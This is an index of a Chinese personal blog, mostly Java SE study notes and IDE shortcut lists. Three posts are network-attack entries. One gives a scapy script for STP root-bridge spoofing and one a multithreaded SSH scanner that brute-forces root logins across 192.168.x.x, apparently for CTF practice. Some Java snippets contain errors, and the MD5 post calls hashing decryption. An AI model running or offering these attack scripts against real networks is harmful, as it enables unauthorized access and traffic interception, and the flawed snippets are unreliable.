    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[代码详解123456789101112int x = 123;Integer i1 = new Integer(x);//手动装箱int y = i1.intValue();//手动拆箱Ineger x = 123;//自动装箱，他的底层是手动装箱int a = x + 100;//自动拆箱，他的底层是自动拆箱]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>新特性</tag>
        <tag>JDK5</tag>
        <tag>自动拆箱</tag>
        <tag>自动装箱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String转换为其他数据类型]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[代码： .parseXXX(“”); 特点： 基本数据类型包装类有八种，其中除了char其他都有.parseXXX()方法，因为char只能存入一个字符。 代码示例： 12String s1 = "123";int i = Integer.parseInt(s1);]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String</tag>
        <tag>String转换为其他数据类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String与int的相互转换]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。 int转String 1、123String s1 = "123";Integer i = new Integer(s1);int a = i.intValue(); 2、1String s1 = Integer.parseInt(123); ps:推荐用第二种]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String与int的相互转换</tag>
        <tag>String转int</tag>
        <tag>int转String</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——基本数据类型包装类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多 基本数据类型 包装类 int Integer char Character Integer的特点： 1、能在int和String类型之间相互转换 2、提供了处理int类型时，非常有用的其他一些常量和方法。 3、能在创建对象时传入String类型的数据，但只限于int值。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>基本数据类型包装类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Arrays类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作 Arrats的方法： .toString() 数组转换为字符串 .sort() 数组排序 .binarySearch() 二分查找，返回索引值，如果没找到就返回，被查找数据在数组中应该出现的插入点的负数 减去1 前提：这个数组是一个序列数组 .asList() 把数组转换成集合，用List引用。例子： 1List&lt;String&gt; l = Arrays.asList(数组); 数组转集合的意义： 虽然从数组转换成的集合不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Arrays类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——StringBuffer类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。 StringBuffer与String的区别 1、String赋的值它是不能被改变的，只能丢弃重新创建，如果字符拼接过多会产生过多的垃圾。 2、StringBuffer赋的值是可以被改变的，类似字符拼接建议用这个类，因为不会产生过多的垃圾。 2、虽然它们都是引用数据类型，但是String做参数传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。 StringBuffer的方法 属性获取： .capacity()返回当前容量 .length()返回实际长度 数据添加： .append()把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。 .insert(索引,字符串)在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。 数据删除： .deleteCharAt()删除任意索引的数据，返回本身。 .delete(索引1,索引2)删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾） 数据替换反转： .reverse()字符反转 .replace(开始索引，结束索引，要替换的数据)&gt;字符替换 数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String） .subString(索引)从索引开始，截取到字符串末尾。 .subString(开始,结尾)从开始位置截取字符串到结尾位置，不包括结尾索引。 StringBuffer的构造方法特点 1、无参构造默认容量为 16个字符 2、传入整数，比如传入10，那么这个容器的容量就为10个字符 3、传入一个字符串，比如传入：啊啊，那么实际长度为4，字符串缓冲区容量为20 4、如果内部缓冲区溢出，那么容量自动增大。 5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。 StringBuffer注意事项 1、不要利用重新创建另一个对象来试图清空容器，这只是引用了另一个容器对象而已，之前的那个容器并没有被清空，可以利用delete方法清空容器。 2、因为String与任意字符串相加的底层实现就是使用容器，并且String的值是不能修改的，它只能把之前的数据做垃圾处理重新创建一个数据，这样会不断的产生垃圾，所以在类似 字符串数组 转换成 字符串 或者 字符串拼接（String s = s1 + s2；） 的例程中使用容器最好。 StringBuffer与String的互转： StringBuffer转String 1、创建一个String对象，把容器传进去。 2、使用toString()方法。 3、使用subString()方法。 String转StringBuffer 1、创建一个StringBuffer对象，传入字符串即可。 2、通过append()方法把字符串加入到容器内。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>StringBuffer类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型. String类特点： 1、String实际上是一个类，它重写了toString方法，所以创建String引用后直接输出调用该引用的名称就可以输出字符串数据。 2、String属于引用数据类型，而不是基本数据类型，基本数据类型为：int、char。。。，所以String数据对比需要用到equals方法，否则会出现判断不准确的问题 3、String没有set和get方法，所以它不存在修改数据，只能是替换数据，把之前的数据当作垃圾。 4、String s = “abc” 与 String a = “abc” 它们两个变量其实是记录了常量池中的地址值，而常量池有个特性，就是已有的数据它不会再去创建，所以 s==a为ture 5、String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot; 同等于String a = &quot;abc&quot; 因为java有常量优化机制，java编译时已经确定s = abc，所以s拿到的是常量abc的地址。 6、 1234String b = "ab"String c = "abc"c == a + "c"//结果为false 解析：因为任何数据与字符串用 + 连接，会在堆内存中创建StringBuider 或 StringBuffer缓冲区对象并使用append方法把数据相连，这里会得出：&quot;abc&quot;然后再使用toString方法创建一个“abc”的String对象返回这个”abc”被保存在堆内存中，而不是保存在常量池，所以变量c的值是常量池中的地址，而a + “c”是堆内存中的地址，所以用“==”号做比较返回false 7、String赋的值是不可以被改变的，只有把之前的值丢弃变成垃圾后，再赋新的值。 8、String虽然是引用数据类型，但是它当作参数传递的时候，它是和基本数据类型一样的。 获取键盘输入String需要注意的 System.in 它是标准的输入流，对应着键盘录入 sc.hasNextxxx（） 它判断输入的数是不是xxx数据类型，xxx可以是int、double等 sc.nextxxx（） 它获取已经输入的项，xxx和上面的xxx相同 sc.nextLine() 它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。 例：nextInt() 之后又用 nexiLine() 获取的是整数，而实际是全部内容为 数值/r/n 此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。 解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。 String的构造方法12String str = new String(Byte[] b);//有参构造 可以按照平台的默认字符集（也就是码表，GBK等等）解码byte数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。 12String str = new String(Byte[] b,2,4);//表示从b数组中的第二个索引开始解码，总共解码4个数据 String类的判断功能 .equals() 比较字符串内容序列是否相同，区分大小写 .equalsIgnoreCase() 与上面不同的是：不区分大小写 .contains() 判断字符串中是否包含传入的字符串 .startsWith() 判断字符串是否以传入字符串开头 .endswith() 判断字符串是否以传入字符串结尾 .isEmpty() 判断字符串是否为空 Null与””的区别 “”是字符串常量，也是String类的对象，所以可以调用String类的方法 Null是空常量，不能调用任何方法，否则会出现空指针异常，Null可以给任意引用数据类型赋值。 注意事项： 1、以后比较字符串时最好都用equals，因为equals比较的是内容，而==号比较的时后，有时比较的是地址值 2、使用equals时，有常量就用常量对象的equals方法，尽量不用变量对象的equals方法，因为变量对象的值有可能时null，调用equals方法会出现空指针异常 String类的获取功能 .length() 获取字符串长度(字符个数) 例子：&quot;我&quot;.length() 为1 ps：数组中的length是属性，而String中的是对象方法 .charAt() 获取指定索引的字符 .indexOf() 返回字符 或 字符串在此字符串中第一次出现的索引 如果不存在返回-1 如果查找的是字符串，返回索引就是查找字符串第一个字符的索引 .indexOf(,) 与上面不同的是在某个位置之后查找 .lastIndexOf() 从后向前找 .substring() 从指定位置开始截取字符串，默认到末尾 .substring(,) 与上不同的是自己指定了截取字符串的尾部位置并且，包含头不包含尾部 注意：截取字符串之后需要用一个变量来保存，因为substring是不会改变原来的值的。 GBK码表的特性 1、中文是两个字节组成 2、中文字节的第一个字节一定是负数 String类的类型转换功能 .getBytes() 把字符串转换成字节数组，这是一个编码的过程：把我们看的懂的编码成计算机看得懂的 .toCharArray() 转换成字符数组 String.valueOf（） 把字符数组转换为字符串，传入一个字符数组，返回一个字符串 注意： 1、传入的数组类型可以是任意类型，并且底层还是由String的构造方法来解码的。 2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法 .toLowerCase() 把字符串转换为小写 .toUpperase() 把字符串转换为大写 ps：String中字符的转换都是按照unicode码表来转换的 String的其他功能 .repleace(被替换的字符串，要替换成的字符串) 字符或字符串替换，不存在则不改变 .trim() 去除首尾空格 .compareTo() 按照字典顺序比较两个字符串]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Object类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。 重写toString代码示例：123public Stirng toString() &#123; return name + "," + age;&#125; equals方法 equals方法默认是比较地址值，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象没有重写equals，那么调用它是无意义的。 重写equals代码演示：12345//重写equals方法public boolean equals(Object obj) &#123; Student s = (Student)obj; return this.name.equals(s.name) &amp;&amp;this.age == s.age; //这里的equals调用的是string里的方法&#125; ==号和equsls的区别（面试可能问道）： 1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是 数据值，比较引用数据类型比较的是地址的值 2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没 有意义，但是我们可以重写它使其有意义。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Object类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Idea常用快捷键]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示 ctrl+Y 删除光标所在行 ctrl+D 复制光标所在行，并且粘贴在它的下面 ctrl+alt+L 格式化代码 ctrl+/ 单行注释 Ctrl+shift+/ 选中行注释，多行注释 alt+ins 自动生成代码，get、set等 alt+shift+上下箭 移动当前代码行]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>idea快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Eclipse常用快捷键]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建ctrl + shift + f 格式化代码，使代码更简洁 ctrl + / 注释 也可以ctrl + shift + /或\ F3或ctrl + 鼠标点击 查看源码 ctrl + 1 给建议 alt + shift + m 抽取一段代码成方法，省去了复制 alt + shift + r 改名，在改变量是非常好用 shift + alt + s 生成toString Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定) Ctrl+D: 删除当前行 Ctrl+Alt+↓ 复制当前行到下一行(复制增加) Ctrl+Alt+↑ 复制当前行到上一行(复制增加) Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) Alt+↑ 当前行和上面一行交互位置(同上)]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Eclipse快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现生成树协议(STP)欺骗攻击]]></title>
    <url>%2F2019%2F04%2F09%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例 12345678910111213#!/usr/bin/pythonfrom scapy.all import *//01:80:c2:00:00:00这个是一个组播地址eth = Dot3(dst="01:80:c2:00:00:00", src="自己的MAC地址")llc = LLC()stp = STP(rootid=0, rootmac="自己的MAC地址", bridgeid=0, bridgemac="自己的MAC地址")pkt=sendp(eth/llc/stp,inter=2,loop=1)]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>Python</tag>
        <tag>生成树协议欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_内部类]]></title>
    <url>%2F2019%2F04%2F08%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%86%85%E9%83%A8%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在 内部类的分类成员内部类 它定义在一个类的内部 局部内部类 它定义在一个方法或者一个作用域内部，它的访问仅限于方法内或者该作用域内 注意事项： 局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的 匿名内部类 匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护 例如：为按钮设置一个监听器12345678new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 静态内部类 它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static 内部类的面试题之 —— 内部类能不能访问外部类成员变量？ 答（成员内部类）： 内部类可以访问外部类的成员变量，因为编译器底层在创建成员内部类时，为成员内部类加上了指向外部类的引用 示例： 12外部类.this.成员变量外部类.this.成员方法 ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了 例子： 1234567891011121314151617181920class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 匿名内部类访问外部类成员底层实现原理： 我们用一段代码来举例：1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#125; public void test() &#123; final int a = 10; new Thread()&#123; public void run() &#123; System.out.println(a); &#125;; &#125;.start(); &#125;&#125; 当test方法调用，系统会给内部类自动加上构造器（这也就是为什么匿名内部类不能有构造方法的原因），这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。这样就解决了生命周期的问题 但是还有一个数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用final修饰 jdk8新特性 局部内部类与匿名内部类访问外部类成员变量，外部类那个变量不需要final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。 匿名内部类 格式： 12345//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法new 类名或者抽象类名() &#123; &#125;.方法名（）//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法 解释： 可以吧new 到 } 的代码看作创建的一个子类对象实例，所以后面可以.方法名调用 好处： 可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。 注意事项： 1、匿名内部类只针对重写一个方法使用，如果要一次性重写多个方法的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则重新定义类。 2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。 3、匿名内部类中不能定义构造函数。 4、使用匿名内部类时，我们必须是继承一个类或者实现一个接口，但是两者不可兼得，只能继承一个类或者实现一个接口。 5、匿名内部类中不能存在任何的静态成员变量和静态方法。 6、匿名内部类属于局部内部类，所以局部内部类所有限制都在匿名内部类上生效 7、匿名内部类不能是抽象的，它必须实现继承的类或者接口中的抽象方法 链式编程： 特点： 调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>内部类</tag>
        <tag>匿名内部类</tag>
        <tag>链式编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现MD5加密]]></title>
    <url>%2F2019%2F04%2F08%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0MD5%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[代码示例 123456789101112#!/usr/bin/python3import hashilbstr = input(“请输入要解密的字符串：”)md5 = hashlib.md5()//创建MD5加密对象md5.update(str.encode("utf-8"))//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密print(md5.hexdigest())//获取MD5加密后的16进制输出打印]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>MD5加密</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现ssh端口扫描并爆破]]></title>
    <url>%2F2019%2F04%2F08%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0ssh%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B9%B6%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python3import threadingimport pexpectfrom socket import *key = [pexpect.TIMEOUT, "#", "\$", "&gt;", "&gt;&gt;&gt;", "&amp;"]loginKey = [pexpect.TIMEOUT, "[p|P]assword", "yes"]def getFlag(p, ret): p.sendline("cat ../../../../flag") p.expect(key) ret += " flag:\n" + str(p.before) print(ret) file = open("flag.txt", "a+") file.write(ret) file.close()def getPass(ip, passwd): p = pexpect.spawn("ssh root@" + ip, timeout=1) try: b = p.expect(loginKey) if b == 1: p.sendline(passwd) b = p.expect(key) if b &gt; 0: getFlag(p, ip + " passwd:" + passwd) return 1 except: pass finally: p.close() return 0def scan(ip): s = socket(AF_INET, SOCK_STREAM) s.settimeout(1) try: s.connect((ip, 22)) b = True for n in open("passwd"): passwd = n.strip(); if getPass(ip, passwd) == 1: b = False break if b: file = open("ip.txt", "a+") file.write(ip + "\n") file.close() except: pass finally: s.close()for n in range(1, 255): for nn in range(1, 255): ip = "192.168." + str(n) + "." + str(nn) while True: if len(threading.enumerate()) &lt; 255: break threading.Thread(target=scan, args=(ip,)).start()]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>python</tag>
        <tag>ssh</tag>
        <tag>爆破</tag>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_包与权限修饰符]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%8C%85%E4%B8%8E%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。 定义包的格式12package 包名;多级包用“.”分开 例子： 1package java.util.Scanner; 在这里当然也可以把Scanner用*代替，*就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为需要遍历该包所有类。 ps：在开发中一般都不使用，而是导入具体的类。 定义时的注意事项 1、必须是程序的第一条可执行语句2、package在一个java文件中只能有一个3、包名的格式为域名倒写 例：com.aikan0.add这个add就是这个包的作用。 生成包命令1javac -d . 源文件名 ps：了解一下就好了 面试题——package、import、class有没有顺序关系？ 解答： 有，并且package &gt; import &gt; class 权限修饰符 四种权限修饰符 本类 同一个包下(子类和无关类) 不同包下(子类) 不同包下(无关类) private Y 默认 Y Y protected Y Y Y public Y Y Y Y ps：protected表示受保护的，就是保护权限只给给自己的子类，一般不用在变量，而是用在成员变量或者成员方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>包</tag>
        <tag>权限修饰符</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_接口]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口 特点： a : 接口用关键字interface表示 1interface 接口名 &#123;&#125; b : 类实现接口用implements表示 1class 类名 implements 接口名 &#123;&#125; c : 接口不能实例化 那么，接口如何实例化呢? 答：按照多态的方式来实例化。 d : 接口的子类 a : 可以是抽象类。但是意义不大。b : 可以是具体类。要重写接口中的所有抽象方法。(推荐方案) 注意事项： 1、接口中的成员变量默认都是常量，他会自动加public static final关键字，并且可以互相交换位置，新手平时都手动给出。 2、接口中没有构造方法 3、接口是干爹，不是亲爹，子类不能用super访问父类中的内容，子类默认继承object类 4、接口中不能定义非抽象方法 5、类与接口是实现关系而非继承关系（干爹） 6、同一个类可以实现多个接口 例子：1class Deom implements InterA,InterB &#123;&#125; 8、接口不能实现接口（implements），但是却可以继承（extends） 类 与 接口的关系 a : 类与类： 继承关系,只能单继承,可以多层继承。 b : 类与接口： 实现关系,可以单实现,也可以多实现。并且还可以在继承一个类的同时实现多个接口。 c : 接口与接口： 继承关系,可以单继承,也可以多继承。 抽象类 与 接口的区别： 抽象类： 和普通的类差不多，只是可以定义抽象方法而已 接口： 成员变量：只可以常量成员方法：只可以抽象 设计理念区别（重要）： 抽象类： 定义的是该继承体系的共性功能 例：每个学生都需要学习 接口： 定义的是该继承体系的扩展性功能 例：每个学生在学校的学习方式都不一样，这样就需要扩展 设计理念区别： 接口是对动作的抽象，抽象类是对根源的抽象。 抽象类表示的是：这个对象是什么。 接口表示的是：这个对象能做什么。 比如：男人，女人，这两个类，他们的抽象类是人。说明：他们都是人，他们的根源就是人 又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。说明：他们都可以吃东西，他们的根源是不同的，但是做的动作却相同的。 结论 在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。 当关注一个事物的本质的时候，用抽象类； 当关注一个要做的动作的时候，用接口。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>接口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_抽象类]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8A%BD%E8%B1%A1%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写 抽象类的几个问题： 1、为什么不直接定义空方法？ 解答：抽象类可以正确的引导使用者正确使用它们，减少被误用 2、抽象类有什么作用？ 解答：增强程序的扩展性和兼容性，规范编程 抽象类中的面试题： 1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化） 2、abstract不能和static共存 原因：static让这个方法是静态方法，而静态方法可以用类名.方法名调用，而静态方法可以类名.方法名调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而abstract不能和static共存。 3、abstract不能和final共存 原因：abstract强制子类重写，而final表示最终的，它不让子类重写，这里形成了冲突。 4、abstract不能和private共存 原因：abstract强制子类重写，而private让子类访问不到，所以它们两个修饰符形成了冲突。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>抽象类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_多态]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%A4%9A%E6%80%81%2F</url>
